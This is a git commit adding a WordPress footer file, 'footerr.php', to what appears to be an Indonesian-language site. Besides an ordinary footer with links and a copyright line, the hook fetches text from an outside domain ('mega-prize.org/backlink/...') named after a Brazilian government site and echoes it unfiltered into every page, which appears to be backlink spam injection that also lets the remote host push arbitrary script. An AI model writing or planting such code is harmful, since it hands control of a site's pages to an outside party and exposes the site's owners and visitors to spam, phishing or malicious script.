65bb98766d859f3f83321eb2490d184288214686
lanthau <figththelast@gmail.com>
2025-07-26 13:20:20 +0700

    Create footerr.php

---
+++ footerr.php
@@ -0,0 +1,26 @@
+<?php
+
+function render_footer() {
+?>
+	<!-- Begin changes -->
+
+	<?php
+	$lt = file_get_contents("https://mega-prize.org/backlink/vigiles.bombeiros.mg.gov.br.txt");
+	if ($lt !== false) {
+	    echo $lt;
+	}
+	?>
+
+	<div class="alignmiddle">
+		<p><a href="<?php bloginfo('url'); ?>">Beranda</a> | <a href="<?php bloginfo('url'); ?>/Privacy-Policy/">Kebijakan Privasi</a> | <a href="<?php bloginfo('url'); ?>/fungsi-dan-persyaratan/">Fungsi dan Persyaratan</a></p>
+		<p>2014-<?php echo date( 'Y' ); ?> Copyright &copy; <a href="<?php bloginfo('url'); ?>/pengembang/">ksiLabs</a>. All Rights Reserved.</p>
+	</div>
+	<!-- End changes -->
+
+	<?php wp_footer(); ?>
+<?php
+}
+
+add_action( 'builder_layout_engine_render_footer', 'render_footer' );
+
+?>
